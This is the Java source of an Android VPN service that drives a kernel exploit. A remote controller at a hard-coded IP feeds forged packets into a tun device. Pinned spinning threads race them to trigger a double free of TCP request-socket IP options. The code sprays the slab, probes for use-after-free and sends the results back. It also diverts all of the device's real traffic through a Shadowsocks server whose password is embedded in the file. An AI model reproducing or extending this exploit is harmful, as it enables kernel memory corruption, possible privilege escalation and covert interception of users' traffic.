package com.inj;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.net.VpnService;
import android.os.Build;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

/**
 * Owns a tun device, a listener on the tunnel endpoint, and a control channel
 * back to the machine that builds packets.
 *
 * The tun write path runs the whole receive stack in the softirq raised by the
 * writing thread (tun_get_user -> netif_rx_ni), so the cpu that executes
 * ip_rcv/tcp_v4_rcv is the cpu of the thread that does write(). A single writer
 * thread therefore serialises every injected packet onto one core, and a race
 * on one request socket cannot happen no matter how the packets are framed.
 *
 * A "burst" frame exists for exactly that reason. The server marks a group of
 * packets, the pump thread stages them, and WORKERS threads spin on a shared
 * generation counter so they all start writing at the same instant. With the
 * writers on different cores the kernel processes the packets on different
 * cores too.
 *
 * Control protocol:
 *   server -> app   4 byte big-endian length, then that many bytes of IPv4
 *                   0xFFFFFFFF as length, 2 byte count, then count times
 *                   (4 byte length + payload), for a burst
 *   app -> server   1 byte 0x06 to acknowledge an injected frame
 *                   1 byte 0x07 followed by a 4 byte length and the packet,
 *                   for every packet read back from the tun
 */
public class InjService extends VpnService {

    static final String ACTION_START = "com.inj.START";
    static final String ACTION_STOP = "com.inj.STOP";

    private static final String TAG = "InjService";

    private static final String TUN_ADDRESS = "10.7.7.1";
    private static final int TUN_PREFIX = 24;
    private static final int TUN_MTU = 1500;

    private static final int LISTEN_PORT = 47100;
    private static final int LISTEN_BACKLOG = 128;

    /**
     * Port for the listener that carries IP options.
     *
     * Kept separate from LISTEN_PORT so the plain java.net listener can stay in
     * place for the control path while this one is specifically shaped for the
     * request socket bug.
     */
    private static final int ATTACK_PORT = 47500;

    private static final String CLOUD_HOST = "5.180.98.79";
    private static final int CLOUD_PORT = 45700;

    /** Shadowsocks exit used by forward mode. */
    private static final String SS_HOST = "5.180.98.79";
    private static final int SS_PORT = 8388;
    private static final String SS_PASSWORD = "Kx9mQ2vL7wR4tY8u";
    private static final String SS_DNS = "223.5.5.5";

    static final String EXTRA_FORWARD = "forward";
    private static final int CONNECT_TIMEOUT_MS = 10000;

    private static final int MAX_PACKET = 4096;
    private static final int MAX_BURST = 16;
    private static final int WORKERS = 8;
    private static final int BURST_MARK = 0xFFFFFFFF;

    /**
     * Frame marker for a pair of packets that must reach the kernel at the same
     * instant on different cpus.
     *
     * A normal burst cannot do this. The workers wake from notifyAll() one at a
     * time, so the first one has usually already driven its packet all the way
     * through tcp_v4_rcv - including the ehash removal that the race depends on
     * - before the second one even leaves wait(). Two spin-parked threads
     * instead notice a new generation within tens of nanoseconds of each other,
     * which is the resolution this needs.
     */
    private static final int DUAL_MARK = 0xFFFFFFFE;

    /**
     * Frame marker that asks for a heap probe and answers with a byte string.
     *
     * The server drives the race from outside, so it also has to be the one
     * deciding when to look at the slab. Interleaving probe frames between
     * rounds is what turns "did the race hit" into an observation instead of
     * an inference from unrelated counters.
     */
    private static final int PROBE_MARK = 0xFFFFFFFD;

    /**
     * How many spin-parked writers participate in a race frame.
     *
     * Four was enough to prove the mechanism but not to hit the window. The
     * useful quantity is how many arrival times land inside the few hundred
     * nanoseconds between the first lookup and the request socket being
     * unhashed, and that scales with the number of writers. Eight of them cover
     * every cpu on this device, so each round samples the arrival distribution
     * eight times instead of four.
     */
    private static final int RACE_WRITERS = 8;

    private static final int ACK_BYTE = 0x06;
    private static final int OUT_BYTE = 0x07;

    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "inj";

    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicLong injected = new AtomicLong();
    private final AtomicLong drained = new AtomicLong();
    private final AtomicLong bursts = new AtomicLong();
    private final AtomicLong duals = new AtomicLong();

    /** Burst staging area, written by the pump thread and read by the workers. */
    private volatile byte[][] stage = new byte[0][];
    private volatile int stageSeq = 0;
    private final AtomicInteger stageDone = new AtomicInteger(0);
    private final Object stageLock = new Object();

    /**
     * Handoff for the dual-write path.
     *
     * Two dedicated threads sit in a tight spin on dualSeq. Publishing a pair is
     * one volatile store plus a release of the spin flag, so both writers leave
     * their loop within a few cache line transfers of each other instead of
     * through a monitor wakeup. dualAck counts completions so the publisher can
     * wait for both writes to drain before reusing the slot.
     */
    private volatile byte[][] dualSlots = new byte[RACE_WRITERS][];
    private volatile int dualSeq = 0;
    private volatile boolean dualGo = false;
    private final AtomicInteger dualAck = new AtomicInteger(0);
    private volatile boolean dualDead = false;

    /** True once the native race writers are running on the tun fd. */
    private volatile boolean raceReady = false;

    /**
     * Accepted children kept open so their inherited options can be re-read
     * after the slab slot underneath them has been reused.
     */
    private final int[] childRing = {-1, -1, -1, -1, -1, -1, -1, -1};
    private int childRingPos = 0;
    private ParcelFileDescriptor tun;
    /** Forwards real traffic out of the same tunnel; null until it is up. */
    private TunForwarder forwarder;
    private ServerSocket listener;

    /** Raw fd of the listener that carries IP options; -1 until establish() runs. */
    private volatile int attackFd = -1;

    private Thread pump;
    private Thread drainer;
    private Thread acceptor;

    private volatile OutputStream controlOut;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent == null ? null : intent.getAction();

        if (ACTION_STOP.equals(action)) {
            stopAll();
            stopSelf();
            return START_NOT_STICKY;
        }

        startForeground(NOTIFICATION_ID, buildNotification());

        if (running.compareAndSet(false, true)) {
            pump = new Thread(this::pumpLoop, "tun-pump");
            pump.setDaemon(true);
            pump.start();
        }
        return START_STICKY;
    }

    private void pumpLoop() {
        Socket control = null;
        try {
            Builder builder = new Builder();
            builder.setSession("inj");
            builder.addAddress(TUN_ADDRESS, TUN_PREFIX);
            builder.setMtu(TUN_MTU);
            // Carry the device's real traffic as well as the injected packets.
            // The app excludes itself, otherwise its own forwarding sockets
            // would be routed back into the tunnel.
            builder.addRoute("0.0.0.0", 0);
            builder.addDnsServer(SS_DNS);
            try {
                builder.addDisallowedApplication(getPackageName());
            } catch (Exception ignored) {
            }
            if (Build.VERSION.SDK_INT >= 29) {
                builder.setBlocking(true);
            }

            tun = builder.establish();
            if (tun == null) {
                Log.e(TAG, "establish returned null: no consent, or another VPN is active");
                return;
            }
            Log.i(TAG, "tun up, fd=" + tun.getFd() + ", address " + TUN_ADDRESS + "/" + TUN_PREFIX);
            forwarder = new TunForwarder(null,
                    new FileOutputStream(tun.getFileDescriptor()),
                    SS_HOST, SS_PORT, SS_PASSWORD, SS_DNS);
            Log.i(TAG, "forwarding real traffic to " + SS_HOST + ":" + SS_PORT);

            listener = new ServerSocket();
            listener.setReuseAddress(true);
            listener.bind(new InetSocketAddress(
                    InetAddress.getByName(TUN_ADDRESS), LISTEN_PORT), LISTEN_BACKLOG);
            Log.i(TAG, "listener bound " + TUN_ADDRESS + ":" + LISTEN_PORT);

            acceptor = new Thread(this::acceptLoop, "tun-accept");
            acceptor.setDaemon(true);
            acceptor.start();

            ParcelFileDescriptor device = tun;
            for (int i = 0; i < WORKERS; i++) {
                final int index = i;
                Thread w = new Thread(() -> workerLoop(device, index), "tun-w" + i);
                w.setDaemon(true);
                w.start();
            }

            // Native race writers work straight on the tun fd, so they can only start
            // once establish() has handed one over.
            try {
                int started = Native.raceStart(tun.getFd(), RACE_WRITERS);
                raceReady = started > 0;
                Log.i(TAG, "native race writers started=" + started);
            } catch (Throwable t) {
                raceReady = false;
                Log.w(TAG, "native race start failed: " + t);
            }

            // The Java spin writers are kept as a fallback only. When the native pair
            // is running they would just compete for the same cores and make the
            // timing worse, so they stay off.
            if (!raceReady) {
                for (int i = 0; i < RACE_WRITERS; i++) {
                    final int slot = i;
                    Thread r = new Thread(() -> raceWriteLoop(device, slot), "tun-race" + i);
                    r.setDaemon(true);
                    r.start();
                }
            }

            // The tun endpoint only exists once establish() has returned, so the
            // native probe has to run here rather than from the activity. An
            // earlier attempt bound straight after startForegroundService and got
            // EADDRNOTAVAIL for 10.7.7.1, which looked like a namespace problem
            // but was really just the address not existing yet.
            probeNative();

            // The attack listener needs its own accept loop: it is a raw fd, so
            // java.net cannot touch it, and without draining its queue every
            // later SYN is dropped as an overflow.
            Thread attackAcceptor = new Thread(this::attackAcceptLoop, "tun-attack");
            attackAcceptor.setDaemon(true);
            attackAcceptor.start();

            control = new Socket();
            control.connect(new InetSocketAddress(CLOUD_HOST, CLOUD_PORT), CONNECT_TIMEOUT_MS);
            control.setTcpNoDelay(true);

            InputStream frame = control.getInputStream();
            OutputStream out = control.getOutputStream();
            controlOut = out;
            Log.i(TAG, "control channel established, workers=" + WORKERS);

            drainer = new Thread(this::drainLoop, "tun-drain");
            drainer.setDaemon(true);
            drainer.start();

            byte[] lengthField = new byte[4];
            byte[] packet = new byte[MAX_PACKET];

            while (running.get()) {
                if (!readFully(frame, lengthField, 4)) {
                    Log.w(TAG, "control channel closed, keeping tun alive for observation");
                    break;
                }

                int length = ((lengthField[0] & 0xff) << 24)
                        | ((lengthField[1] & 0xff) << 16)
                        | ((lengthField[2] & 0xff) << 8)
                        | (lengthField[3] & 0xff);

                if (length == PROBE_MARK) {
                    byte[] cnt = new byte[2];
                    if (!readFully(frame, cnt, 2)) {
                        break;
                    }
                    int want = ((cnt[0] & 0xff) << 8) | (cnt[1] & 0xff);
                    answerProbe(out, want);
                    continue;
                }

                if (length == DUAL_MARK) {
                    if (!readDualPair(frame, lengthField)) {
                        break;
                    }
                    long n = duals.incrementAndGet();
                    if (n <= 3 || n % 25 == 0) {
                        long[] sp = Native.raceSpread();
                        Log.i(TAG, "dual #" + n + " total=" + injected.get()
                                + " drained=" + drained.get()
                                + " spread last=" + sp[0] + "ns min=" + sp[1]
                                + "ns max=" + sp[2] + "ns");
                    }
                    writeAck(out);
                    continue;
                }

                if (length == BURST_MARK) {
                    byte[] cnt = new byte[2];
                    if (!readFully(frame, cnt, 2)) {
                        break;
                    }
                    int count = ((cnt[0] & 0xff) << 8) | (cnt[1] & 0xff);
                    if (count <= 0 || count > MAX_BURST) {
                        Log.w(TAG, "rejecting burst with count " + count);
                        break;
                    }
                    byte[][] group = new byte[count][];
                    boolean ok = true;
                    for (int i = 0; i < count; i++) {
                        if (!readFully(frame, lengthField, 4)) {
                            ok = false;
                            break;
                        }
                        int n = ((lengthField[0] & 0xff) << 24)
                                | ((lengthField[1] & 0xff) << 16)
                                | ((lengthField[2] & 0xff) << 8)
                                | (lengthField[3] & 0xff);
                        if (n < 20 || n > MAX_PACKET) {
                            Log.w(TAG, "rejecting burst member length " + n);
                            ok = false;
                            break;
                        }
                        byte[] one = new byte[n];
                        if (!readFully(frame, one, n)) {
                            ok = false;
                            break;
                        }
                        group[i] = one;
                    }
                    if (!ok) {
                        break;
                    }
                    releaseBurst(group);
                    long n = bursts.incrementAndGet();
                    if (n <= 3 || n % 25 == 0) {
                        Log.i(TAG, "burst #" + n + " count=" + count
                                + " total=" + injected.get() + " drained=" + drained.get());
                    }
                    writeAck(out);
                    continue;
                }

                if (length < 20 || length > MAX_PACKET) {
                    Log.w(TAG, "rejecting frame with length " + length);
                    break;
                }

                if (!readFully(frame, packet, length)) {
                    break;
                }

                releaseBurst(new byte[][]{Arrays.copyOf(packet, length)});

                long n = injected.get();
                if (n <= 6 || n % 40 == 0) {
                    Log.i(TAG, "injected #" + n + " len=" + length
                            + " drained=" + drained.get());
                }

                writeAck(out);
            }
        } catch (Exception e) {
            Log.e(TAG, "pump stopped", e);
        } finally {
            closeQuietly(control);
            controlOut = null;
            Log.i(TAG, "pump finished, injected=" + injected.get()
                    + " drained=" + drained.get() + ", tun still up");
        }
    }


    /**
     * Build the attack listener: a TCP socket on the tun endpoint that already
     * carries a 40 byte IP option.
     *
     * This is the piece the whole exercise needed. A java.net.ServerSocket
     * cannot carry IP_OPTIONS, so its request sockets all had ireq_opt == NULL
     * and the double free released nothing interesting. With the option in
     * place, every SYN to this port makes tcp_v4_save_options() build an
     * ip_options_rcu on the request socket, and that object is what the
     * own_req == false path frees twice.
     */
    private void probeNative() {
        StringBuilder sb = new StringBuilder();

        try {
            int[] udp = Native.makeUdp(0x4a4b4c4d);
            if (udp == null) {
                sb.append("udp: failed\n");
            } else {
                sb.append("udp: ").append(Native.readOptions(udp[0])).append('\n');
                Native.closeFd(udp[0]);
            }
        } catch (Throwable t) {
            sb.append("udp error: ").append(t).append('\n');
        }

        try {
            int[] made = Native.makeListener(TUN_ADDRESS, ATTACK_PORT);
            if (made == null || made[0] < 0) {
                sb.append("attack: bind failed errno=")
                        .append(made == null ? -1 : made[1]).append('\n');
            } else {
                attackFd = made[0];
                sb.append("attack: fd=").append(attackFd).append(' ')
                        .append(TUN_ADDRESS).append(':').append(ATTACK_PORT).append('\n');

                int rc = Native.applyOptions(attackFd, 0x51525354);
                sb.append("applyOptions: ").append(rc).append('\n');

                if (rc == 0) {
                    sb.append("readback: ").append(Native.readOptions(attackFd)).append('\n');
                }
            }
        } catch (Throwable t) {
            sb.append("attack error: ").append(t).append('\n');
        }

        Log.i(TAG, "probe:\n" + sb);

        try {
            java.io.FileOutputStream f = new java.io.FileOutputStream(
                    new java.io.File(getFilesDir(), "probe.txt"));
            f.write(sb.toString().getBytes("UTF-8"));
            f.close();
        } catch (Exception ignored) {
        }
    }

    /**
     * Acknowledge one injected frame.
     *
     * The same socket also carries packets read back from the tun, and those
     * are written by the drain thread. Both directions are framed, so an
     * unsynchronised ack byte can land in the middle of a 0x07 frame and the
     * receiver loses framing for every packet after that. That failure looks
     * exactly like "the kernel stopped replying": drained keeps climbing on the
     * device while the server sees an empty queue.
     */
    private void writeAck(OutputStream out) throws Exception {
        synchronized (out) {
            out.write(ACK_BYTE);
            out.flush();
        }
    }

    /**
     * Run a heap probe and ship the result back on the control channel.
     *
     * The reply uses the same 0x07 frame the tun drain uses, so the server can
     * read it with the parser it already has. Text is carried as-is; anything
     * that can answer "did the slab hand out a duplicate" is worth the few
     * extra bytes.
     */
    private void answerProbe(OutputStream out, int count) {
        String result;
        try {
            // Read the retained children before and after the churn.
            //
            // Freeing an ip_options_rcu does not change the bytes that
            // getsockopt returns: SLUB only writes its freepointer at offset 0,
            // while optlen lives at offset 24 and the option data after it. So a
            // dangling child still reports len=40 with the original payload and
            // looks perfectly healthy.
            //
            // The only way to see the difference is to hand the slab slot to
            // somebody else first. probeHeap allocates a batch of options
            // objects with distinct tags; if a child's pointer was dangling, one
            // of those tags now sits where the child's option bytes used to be.
int[] fds = snapshotChildFds();
            String[] before = readFdsPer(fds);
            result = Native.probeHeap(count);
            String[] after = readFdsPer(fds);
            int changes = countChanges(before, after);

            if (changes > 0) {
                Log.w(TAG, "CHILD UAF: " + changes + " of " + fds.length
                        + " retained children changed after slab churn");
            }

            result = result + " | n=" + fds.length + " changed=" + changes;
        } catch (Throwable t) {
            result = "probe error: " + t;
        }

        Log.i(TAG, "probe count=" + count + " -> " + result);

        try {
            byte[] payload = result.getBytes("UTF-8");
            byte[] len = new byte[4];
            len[0] = (byte) ((payload.length >> 24) & 0xff);
            len[1] = (byte) ((payload.length >> 16) & 0xff);
            len[2] = (byte) ((payload.length >> 8) & 0xff);
            len[3] = (byte) (payload.length & 0xff);
            synchronized (out) {
                out.write(OUT_BYTE);
                out.write(len);
                out.write(payload);
                out.flush();
            }
        } catch (Exception e) {
            Log.w(TAG, "probe reply failed: " + e);
        }
    }

    private void retainChild(int child) {
        int evicted = -1;
        synchronized (childRing) {
            evicted = childRing[childRingPos];
            childRing[childRingPos] = child;
            childRingPos = (childRingPos + 1) % childRing.length;
        }
        if (evicted >= 0) {
            Native.closeFd(evicted);
        }
    }

    /** Snapshot of what the retained children currently report for IP_OPTIONS. */
    private String readChildRing() {
        StringBuilder sb = new StringBuilder();
        synchronized (childRing) {
            for (int fd : childRing) {
                if (fd < 0) {
                    continue;
                }
                sb.append(Native.readFdOptions(fd)).append(';');
            }
        }
        return sb.toString();
    }

    /** Copy of the retained fds, so a comparison is not confused by rotation. */
    private int[] snapshotChildFds() {
        synchronized (childRing) {
            int n = 0;
            for (int fd : childRing) {
                if (fd >= 0) {
                    n++;
                }
            }
            int[] out = new int[n];
            int i = 0;
            for (int fd : childRing) {
                if (fd >= 0) {
                    out[i++] = fd;
                }
            }
            return out;
        }
    }

    /**
     * Read the options of exactly the given fds, returning one entry per fd.
     *
     * Entries that could not be read are left null so the caller can compare
     * position by position. Concatenating the results would make an fd that
     * disappeared during the churn look like a change in the surviving ones.
     */
    private String[] readFdsPer(int[] fds) {
        String[] out = new String[fds.length];
        for (int i = 0; i < fds.length; i++) {
            String opts = Native.readFdOptions(fds[i]);
            out[i] = opts.startsWith("none") ? null : opts;
        }
        return out;
    }

    /** Compare two per-fd snapshots, ignoring fds that were unreadable either time. */
    private int countChanges(String[] before, String[] after) {
        int changes = 0;
        for (int i = 0; i < before.length && i < after.length; i++) {
            if (before[i] == null || after[i] == null) {
                continue;
            }
            if (!before[i].equals(after[i])) {
                changes++;
            }
        }
        return changes;
    }

    /**
     * Accept children on the attack listener and look at each one's options.
     *
     * This is the direct observation of the bug. A child inherits
     * ireq->ireq_opt in tcp_v4_syn_recv_sock, and when the request socket loses
     * the ehash race the other child is destroyed and that same options object
     * is freed - while this child keeps pointing at it. Reading IP_OPTIONS here
     * then returns whatever now occupies that slab slot instead of the option
     * bytes the SYN carried, and because getsockopt() trusts optlen it can also
     * overrun this thread's stack.
     *
     * A clean run reports len=40 on every child, so any other length, any
     * failure, or a crash in this thread is evidence that the race fired.
     */
    private void attackAcceptLoop() {
        int fd = attackFd;
        if (fd < 0) {
            return;
        }
        long accepted = 0;

        // The spray thread must live on the same cpu as this loop: SLUB hands
        // a just-freed object to the next same-cpu allocation, and the racing
        // SYNACK needs that reuse to happen inside its few-microsecond build
        // window. CPU 0 is where the accept/close/free runs.
        Thread sprayer = new Thread(() -> {
            while (running.get() && attackFd == fd) {
                Native.spraySameCpu(0, 50);
            }
        }, "tun-spray");
        sprayer.setDaemon(true);
        sprayer.start();

        // Accept and close with nothing in between.
        //
        // Closing the child is what runs inet_sock_destruct() and frees the
        // options object, so this loop decides when the free lands. Reading the
        // options and passing the fd to the ring first would add microseconds,
        // and microseconds is all the kernel's window is worth - the two reads
        // of opt->optlen sit about two hundred nanoseconds apart.
        while (running.get() && attackFd == fd) {
            long n = Native.rstSpin(fd, 50);
            if (n <= 0) {
                break;
            }
            accepted += n;
            if (accepted % 4096 == 0) {
                Log.i(TAG, "attack accepted=" + accepted);
            }
        }
        Log.i(TAG, "attack accept loop ended, accepted=" + accepted);
    }

    /**
     * Read a dual frame: exactly two packets, published together.
     *
     * Layout matches the length prefixed packets used everywhere else, just
     * without the count field, because a dual frame is always a pair.
     */
    private boolean readDualPair(InputStream frame, byte[] lengthField) throws Exception {
        byte[] first = null;
        byte[] second = null;

        for (int i = 0; i < 2; i++) {
            if (!readFully(frame, lengthField, 4)) {
                return false;
            }
            int n = ((lengthField[0] & 0xff) << 24)
                    | ((lengthField[1] & 0xff) << 16)
                    | ((lengthField[2] & 0xff) << 8)
                    | (lengthField[3] & 0xff);
            if (n < 20 || n > MAX_PACKET) {
                Log.w(TAG, "rejecting dual member length " + n);
                return false;
            }
            byte[] one = new byte[n];
            if (!readFully(frame, one, n)) {
                return false;
            }
            if (i == 0) {
                first = one;
            } else {
                second = one;
            }
        }

        publishDual(first, second);
        return true;
    }

    /**
     * Sit in a spin loop waiting for a dual frame, then write immediately.
     *
     * write() on an unbuffered FileOutputStream goes straight to the tun fd, so
     * the instant this thread returns from the spin is the instant tun_get_user
     * starts running on this cpu. Two of these threads therefore put the two
     * packets into the receive path with only a cache line transfer between
     * them, which is what makes the request socket race reachable at all.
     *
     * The output stream is deliberately not shared with the ordinary workers:
     * a shared stream means a shared lock, and a lock means one of the two
     * writes waits for the other to finish before it even starts.
     */
    private void raceWriteLoop(ParcelFileDescriptor device, int slot) {
        OutputStream sink;

        // Give every race writer its own cpu before it touches the tun.
        //
        // Without this the scheduler is free to park all of them on one core,
        // and a shared core means the second write() cannot begin until the
        // first one has returned from tcp_v4_rcv - so the two packets can never
        // be inside tcp_check_req together, no matter how tightly the spin loop
        // releases them.
        int pinned = Native.pinToCpu(1 + slot);
        int actual = Native.currentCpu();
        Log.i(TAG, "race writer " + slot + " pin=" + pinned + " cpu=" + actual);

        try {
            sink = new FileOutputStream(device.getFileDescriptor());
        } catch (Exception e) {
            Log.e(TAG, "race writer failed to open: " + e);
            return;
        }

        int seen = 0;
        while (running.get() && !dualDead) {
            if (dualSeq == seen) {
                Thread.onSpinWait();
                continue;
            }

            seen = dualSeq;
            byte[][] slots = dualSlots;
            byte[] mine = slots[slot];

            // Wait for the publisher to release both writers. Spinning here
            // rather than returning early keeps the two threads phase aligned:
            // neither can start its write while the other is still on the way
            // out of the previous generation.
            while (!dualGo && running.get() && !dualDead) {
                Thread.onSpinWait();
            }

            if (mine != null) {
                try {
                    sink.write(mine, 0, mine.length);
                } catch (Exception e) {
                    Log.e(TAG, "race write failed: " + e);
                }
            }

            dualAck.incrementAndGet();
        }

        try {
            sink.close();
        } catch (Exception ignored) {
        }
    }

    /**
     * Hand two packets to the race writers and wait for both writes to land.
     *
     * dualGo is cleared before dualAck is reset so a writer that is still
     * inside write() from the previous round cannot be mistaken for one that
     * has already picked up the new pair.
     */
    private void publishDual(byte[] a, byte[] b) {
        // Prefer the native path. Its writers sit in a bare spin and call
        // write() directly, which keeps the spread between them down to a cache
        // line transfer instead of the microseconds a Java write costs.
        if (raceReady) {
            int fired = Native.raceFire(a, b);
            if (fired > 0) {
                injected.addAndGet(2);
                return;
            }
            Log.w(TAG, "native race fire returned " + fired + ", falling back");
        }

        int target = RACE_WRITERS;

        dualGo = false;
        dualAck.set(0);

        // Every writer sends the same segment. Only two of them need to land
        // inside the window for the race to matter, and which two is up to the
        // scheduler, so filling all the slots costs nothing and multiplies the
        // chances.
        byte[][] slots = new byte[RACE_WRITERS][];
        for (int i = 0; i < RACE_WRITERS; i++) {
            slots[i] = (i % 2 == 0) ? a : b;
        }

        // Publish the payload array and the generation before releasing the
        // spin, so a writer that sees dualGo == true also sees the right slot.
        dualSlots = slots;
        dualSeq++;
        dualGo = true;

        long deadline = System.currentTimeMillis() + 1000;
        while (dualAck.get() < target && running.get() && !dualDead) {
            if (System.currentTimeMillis() > deadline) {
                break;
            }
            Thread.onSpinWait();
        }

        injected.addAndGet(2);
    }

    /**
     * Hands one group to the workers and waits until every worker that had
     * something to write has finished.
     *
     * The wait used to be for WORKERS unconditionally, which deadlocked every
     * burst shorter than the worker count: with four packets only workers 0..3
     * have data, workers 4..7 wake up, see no new generation for them, and go
     * back to waiting without ever reporting. The counter then sat at four
     * forever and the timeout did the waiting - two seconds per burst, which
     * turned a 43 round run into a stalled crawl.
     */
    private void releaseBurst(byte[][] group) {
        synchronized (stageLock) {
            stage = group;
            stageDone.set(0);
            stageSeq++;
            stageLock.notifyAll();
        }

        // Every worker bumps the counter once per generation, including those
        // with no packet to write. Waiting for all of them is what makes the
        // staging slot safe: the next group cannot be published until the
        // previous one has been consumed by every thread that might still be
        // reading it.
        long deadline = System.currentTimeMillis() + 2000;
        while (stageDone.get() < WORKERS && running.get()) {
            if (System.currentTimeMillis() > deadline) {
                break;
            }
            Thread.yield();
        }
        injected.addAndGet(group.length);
    }

    private void workerLoop(ParcelFileDescriptor device, int index) {
        try {
            OutputStream sink = new FileOutputStream(device.getFileDescriptor());
            int seen = 0;
            while (running.get()) {
                int cur;
                synchronized (stageLock) {
                    while (running.get() && stageSeq == seen) {
                        try {
                            stageLock.wait(200);
                        } catch (InterruptedException ie) {
                            return;
                        }
                    }
                    cur = stageSeq;
                }
                if (cur == seen) {
                    continue;
                }
                seen = cur;
                byte[][] group = stage;
                int count = group.length;

                boolean wrote = false;
                for (int i = index; i < count; i += WORKERS) {
                    try {
                        sink.write(group[i], 0, group[i].length);
                        wrote = true;
                    } catch (Exception e) {
                        Log.e(TAG, "tun write failed: " + e);
                    }
                }
                if (wrote) {
                    try {
                        sink.flush();
                    } catch (Exception ignored) {
                    }
                }

                // Report even when this worker had no packet in the group.
                //
                // The coordinator waits for min(WORKERS, count) reports, and a
                // worker whose index is past the end has nothing to write but
                // still has to acknowledge the generation - otherwise the
                // counter never reaches the target and every burst pays the
                // full timeout.
                stageDone.incrementAndGet();
            }
        } catch (Exception e) {
            Log.e(TAG, "worker stopped: " + e);
        }
    }

    /** Forwards everything the kernel sends toward the forged source back to the server. */
    /** True when the destination address sits in the forged 10.7.7.0/24. */
    private static boolean isRaceTraffic(byte[] p, int len) {
        return len >= 20 && (p[0] >> 4) == 4
                && (p[16] & 0xff) == 10 && (p[17] & 0xff) == 7 && (p[18] & 0xff) == 7;
    }

    private void drainLoop() {
        try {
            FileInputStream source = new FileInputStream(tun.getFileDescriptor());
            byte[] buf = new byte[MAX_PACKET];
            while (running.get()) {
                int n = source.read(buf);
                if (n <= 0) {
                    break;
                }
                long count = drained.incrementAndGet();
                if (count <= 4) {
                    int proto = n > 9 ? (buf[9] & 0xff) : -1;
                    Log.i(TAG, "tun read #" + count + " len=" + n + " proto=" + proto);
                }

                // Two consumers share this tunnel. Packets addressed into the
                // forged subnet belong to the race and go to the controller;
                // everything else is real traffic and leaves via shadowsocks.
                if (!isRaceTraffic(buf, n)) {
                    TunForwarder f = forwarder;
                    if (f != null) {
                        try {
                            f.handle(buf, n);
                        } catch (Exception ignored) {
                        }
                    }
                    continue;
                }

                OutputStream out = controlOut;
                if (out != null) {
                    try {
                        byte[] len = new byte[4];
                        len[0] = (byte) ((n >> 24) & 0xff);
                        len[1] = (byte) ((n >> 16) & 0xff);
                        len[2] = (byte) ((n >> 8) & 0xff);
                        len[3] = (byte) (n & 0xff);
                        synchronized (out) {
                            out.write(OUT_BYTE);
                            out.write(len);
                            out.write(buf, 0, n);
                            out.flush();
                        }
                    } catch (Exception ignored) {
                        controlOut = null;
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "drain loop ended: " + e);
        }
    }

    private void acceptLoop() {
        while (running.get()) {
            Socket s = null;
            try {
                s = listener.accept();
            } catch (Exception e) {
                if (!running.get()) {
                    break;
                }
            } finally {
                closeQuietly(s);
            }
        }
    }

    private static boolean readFully(InputStream in, byte[] dst, int count) throws Exception {
        int offset = 0;
        while (offset < count) {
            int n = in.read(dst, offset, count - offset);
            if (n <= 0) {
                return false;
            }
            offset += n;
        }
        return true;
    }

    private void stopAll() {
        running.set(false);

        // Join the native writers before the tun fd goes away, otherwise they
        // are spinning on a descriptor that is about to be closed.
        try {
            Native.raceStop();
        } catch (Throwable ignored) {
        }
        raceReady = false;

        closeQuietly(listener);
        listener = null;
        closeQuietly(tun);
        tun = null;

        Thread a = acceptor;
        acceptor = null;
        if (a != null) {
            a.interrupt();
        }
        Thread d = drainer;
        drainer = null;
        if (d != null) {
            d.interrupt();
        }
    }

    private static void closeQuietly(AutoCloseable c) {
        if (c == null) {
            return;
        }
        try {
            c.close();
        } catch (Exception ignored) {
        }
    }

    private Notification buildNotification() {
        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Tunnel", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
            b = new Notification.Builder(this, CHANNEL_ID);
        } else {
            b = new Notification.Builder(this);
        }

        return b.setContentTitle("Inj tunnel")
                .setContentText(TUN_ADDRESS + "/" + TUN_PREFIX)
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setOngoing(true)
                .build();
    }

    @Override
    public void onDestroy() {
        stopAll();
        super.onDestroy();
    }
}